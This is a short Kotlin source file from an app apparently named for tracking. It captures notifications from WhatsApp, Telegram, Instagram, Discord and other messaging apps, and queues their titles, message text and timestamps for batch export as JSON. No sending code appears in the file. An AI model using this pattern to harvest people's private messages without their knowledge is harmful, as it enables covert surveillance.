package com.takip.app.service

import org.json.JSONArray
import org.json.JSONObject
import java.util.Collections

object NotificationQueue {
    private val queue = Collections.synchronizedList(mutableListOf<JSONObject>())

    private val socialPackages = setOf(
        "com.whatsapp",
        "com.facebook.katana",
        "com.facebook.orca",
        "com.instagram.android",
        "org.telegram.messenger",
        "com.twitter.android",
        "com.snapchat.android",
        "com.zhiliaoapp.musically",
        "com.viber.voip",
        "com.discord"
    )

    fun add(packageName: String, appName: String?, title: String?, text: String?) {
        if (!socialPackages.any { packageName.startsWith(it) } && !packageName.contains("whatsapp")) return
        queue.add(JSONObject().apply {
            put("appPackage", packageName)
            put("appName", appName)
            put("title", title)
            put("text", text)
            put("timestamp", java.time.Instant.now().toString())
        })
    }

    fun drain(): JSONArray {
        val array = JSONArray()
        synchronized(queue) {
            queue.forEach { array.put(it) }
            queue.clear()
        }
        return array
    }
}
